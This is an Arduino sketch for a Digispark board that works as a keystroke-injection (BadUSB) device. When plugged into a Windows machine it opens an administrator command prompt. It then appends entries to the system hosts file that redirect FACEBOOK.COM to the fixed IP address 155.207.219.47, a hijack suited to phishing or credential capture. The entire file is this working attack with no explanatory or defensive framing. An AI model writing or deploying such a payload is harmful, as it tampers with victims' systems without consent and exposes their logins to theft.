#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.println("ECHO. >> C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS");
  DigiKeyboard.println("ECHO  155.207.219.47 FACEBOOK.COM >> C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS");
  
  DigiKeyboard.println("ECHO. >> C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS");
  DigiKeyboard.println("ECHO  155.207.219.47 FACEBOOK.COM >> C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS");
  
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  
  DigiKeyboard.delay(100);

  for(; ; );
}
